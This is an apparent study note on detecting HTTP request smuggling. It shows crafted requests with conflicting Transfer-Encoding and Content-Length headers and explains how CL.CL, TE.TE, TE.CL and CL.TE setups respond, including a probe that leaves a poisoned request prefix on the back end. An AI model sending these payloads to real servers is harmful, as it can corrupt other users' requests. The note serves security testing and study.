# How to detect HTTP Smuggling
```
Transfer-Encoding: chunked
Content-Length: 6

3\r\n
abc
Q
```


# CL.CL
front CL looks at 6 characters 
```
3/r/n
abc
```

back CL looks at and rejects
```
Q
```

response back immediately by **backend**

# TE.TE and TE.CL
front TE will see that `3` is chunked size, read `abc` then it will read in the next chunk size and see `Q` and that its not a valid chunk size, straight up reject. response back immediately by **front end**. It wont even go to the backend.


# CL.TE
If front CL looks at 6 characters 
```
3/r/n
abc
```
and then passes above data to the backend who is TE which sees this (without the `Q` character. 
```
3/r/n
abc
```
The backend will **timeout** as it is expecting for a chunk size


### Alternative way to check if CL.TE
To confirm the detection, **this may affect other users**
```
Transfer-Encoding: chunked
Content-Length: 6

0/r/n
/r/n
X
```

Front CL will read the 6 characters which is good, and passes it on to back TE
```
0/r/n
/r/n
X
```
TE will see that chunk size is 0 and the `X` will be left hanging as the next request (**poisoned**)